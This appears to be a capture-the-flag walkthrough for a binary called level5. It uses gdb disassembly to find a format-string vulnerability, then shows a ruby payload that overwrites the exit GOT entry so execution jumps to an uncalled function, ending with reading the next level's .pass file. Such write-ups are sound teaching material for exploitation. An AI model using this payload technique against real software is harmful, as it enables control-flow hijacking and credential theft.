When disassembling the function 'n', we can see a call to printf.
We list the functions with
    (gdb) info functions
    ...
    0x080484a4  o
    0x080484c2  n
    0x08048504  main
    ...
We can see that there is a function 'o' but it is never called by function main or function 'n'. 
We will try to call it using the printf vulnerability.
There is a call to function exit after the call to printf
    (gdb) disass n
    Dump of assembler code for function n:
       0x080484c2 <+0>:     push   %ebp
       0x080484c3 <+1>:     mov    %esp,%ebp
       0x080484c5 <+3>:     sub    $0x218,%esp
       0x080484cb <+9>:     mov    0x8049848,%eax
       0x080484d0 <+14>:    mov    %eax,0x8(%esp)
       0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
       0x080484dc <+26>:    lea    -0x208(%ebp),%eax
       0x080484e2 <+32>:    mov    %eax,(%esp)
       0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
       0x080484ea <+40>:    lea    -0x208(%ebp),%eax
       0x080484f0 <+46>:    mov    %eax,(%esp)
       0x080484f3 <+49>:    call   0x8048380 <printf@plt>
       0x080484f8 <+54>:    movl   $0x1,(%esp)
       0x080484ff <+61>:    call   0x80483d0 <exit@plt>
    End of assembler dump.

When we disass 'exit' we can see a jmp *address that we will use for our exploit.
    (gdb) disass exit
    Dump of assembler code for function exit@plt:
       0x080483d0 <+0>:     jmp    *0x8049838
       0x080483d6 <+6>:     push   $0x28
       0x080483db <+11>:    jmp    0x8048370
    End of assembler dump.

We will need to write the address of 'o' (0x080484a4 = 134513828) in the jmp *address (0x8049838).

$ ruby -e 'print "\x38\x98\x04\x08" + "%134513824x%4\$n"' > /tmp/buffer
$ cat /tmp/buffer - | ./level5
$ cat /home/user/level6/.pass
